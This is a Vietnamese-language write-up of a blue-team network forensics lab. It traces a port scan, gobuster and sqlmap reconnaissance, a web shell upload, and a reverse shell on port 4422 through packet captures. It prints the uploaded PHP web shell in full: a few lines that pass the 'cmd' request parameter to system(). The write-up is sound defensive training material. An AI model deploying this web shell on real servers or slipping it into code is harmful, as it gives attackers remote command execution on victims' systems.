[Network Analysis – Web Shell](https://blueteamlabs.online/home/challenge/network-analysis-web-shell-d4d3a2821b)<br>

### 1. Kịch bản

- SOC nhận được alert từ SIEM: local to local port scanning - IP private quét hệ thống nội bộ khác

### 2. Write-up

1. What is the IP responsible for conducting the port scan activity?
- Xem thống kê IPv4, xuất hiện IP: 10.251.96.4 vừa nằm trong dải IP private vừa gửi rất nhiều gói tin
    - Dải IP private
        - 10.0.0.0/8
        - 172.16.0.0/12
        - 192.168.0.0/16

<img width="848" height="524" alt="image" src="https://github.com/user-attachments/assets/b8d1f7cb-db49-47ec-a616-0195735062ec" />


- Sử dụng bộ lọc: ip.src == 10.251.96.4, xác nhận địa chỉ IP này gửi hàng loại gói tin đến nhiều port khác nhau tới địa chỉ IP 10.251.96.5

<img width="1253" height="343" alt="image" src="https://github.com/user-attachments/assets/60147a5c-c27a-42fc-bd04-cbfb181911b6" />


2. What is the port range scanned by the suspicious host?
- Dải cổng là từ 1-1024 → nhắm vào các cổng nổi tiếng thường chứa các dịch vụ thông dụng

<img width="805" height="486" alt="image" src="https://github.com/user-attachments/assets/11dda0f3-9efa-4346-bd91-76cd2376e505" />


3. What is the type of port scan conducted?
- Máy tấn công gửi gói SYN đến máy nhạn nhân và nhận phản hồi
    - Nhận được RST, ACK → cổng đóng
    - Nhận được SYN-ACK → cổng mở

→ Loại tấn công: TCP SYN Scan

4. Two more tools were used to perform reconnaissance against open ports, what were they?
- Thông tin về công cụ → điều tra user-agent cho gói tin gửi tới nạn nhân (http.user_agent)
- Thu được công cụ: "User-Agent: gobuster/3.0.1\r\n”
    - Gobuster: công cụ brute-force thư mục/file (trong web) , DNS, virtual host

<img width="1047" height="612" alt="image" src="https://github.com/user-attachments/assets/29042c4d-3188-4ca8-8ae3-30c07b0fd90a" />


- Sau khi lọc bỏ 2 loại user-agent đã biết, thu được thông tin công cụ thứ 3
    - SQLMap: tự động phát hiện và khai thác lỗ hổng SQLi và chiếm quyền kiểm soát hệt thống

<img width="1277" height="684" alt="image" src="https://github.com/user-attachments/assets/ef623813-5ac1-4b60-a87e-03ffb8c5bb3f" />


5. What is the name of the php file through which the attacker uploaded a web shell?
- Web shell: web script được tải lên hệ thống có lỗ hổng để tương tác và duy trì truy cập vào hệ thống (đã bị xâm nhập)
- Kẻ tấn công gửi file lên POST /upload.php HTTP/1.1 được chuyển hướng từ Referer: http://10.251.96.5/editprofile.php để tải web shell lên
    - Referer: cho biết trang nào đã dấn đến request này
6. What is the name of the web shell that the attacker uploaded?
- File upload lên: Content-Disposition: form-data; name="fileToUpload"; filename="dbfunctions.php”
- Nội dung file

```basic
<?php
if(isset($_REQUEST['cmd']) ){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd); //thuc thi lenh he thong
echo "</pre>";
die;
}
```

7. What is the parameter used in the web shell for executing commands?
- Dựa trên nội dung file và truy vấn của request → tham số được dùng để thực thi lệnh là cmd

<img width="1163" height="233" alt="image" src="https://github.com/user-attachments/assets/bfb48d33-8460-489f-a57d-4973512905b5" />


8. What is the first command executed by the attacker?
- Lệnh đầu tiên là id → danh tính và quyền của tiến tình đang chạy + kiểm tra web shell hoạt động chưa
- uid cho biết user mà web server chạy dưới quyền → www-data có quyền thực thi lệnh

<img width="756" height="407" alt="image" src="https://github.com/user-attachments/assets/4da5f9cb-d04a-4855-b8d1-0f93852abb98" />


9. What is the type of shell connection the attacker obtains through command execution?
- Kẻ tấn công gửi mã python yêu cầu server tạo kết nối socket đến máy kẻ tấn công để tạo shell kết nối → reverse shell
- Các loại shell conn
    - Bind shell: nạn nhân mở 1 cổng để kẻ tấn công mở kết nối đến → dễ bị firewall chặn
    - Reverse shell: máy nạn nhân mở kết nối đến máy kẻ tấn công → bypass firewall
    - Double reverse shell: phức tạp hơn, dùng 2 kênh riêng cho lưu lượng vào/ra
    - Web shell: script chạy lệnh thông qua HTTP request
10. What is the port he uses for the shell connection?
- Port: 4422

### 3. Kết luận

- Kẻ tấn công sử dụng máy có IP nằm trong cùng mạng LAN với máy nạn nhân và thực hiện quét port nhắm vào các dịch vụ thông dụng
- Từ trang editprofile, attacker tải lên file chứa shell web thông qua file upload.php để thực hiện lệnh thông qua truy vấn
- Sau khi tải web shell thành công, attacker truy vấn yêu cầu máy nạn nhân tạo reverse shell tới máy kẻ tấn công để thực hiện kết nối C2
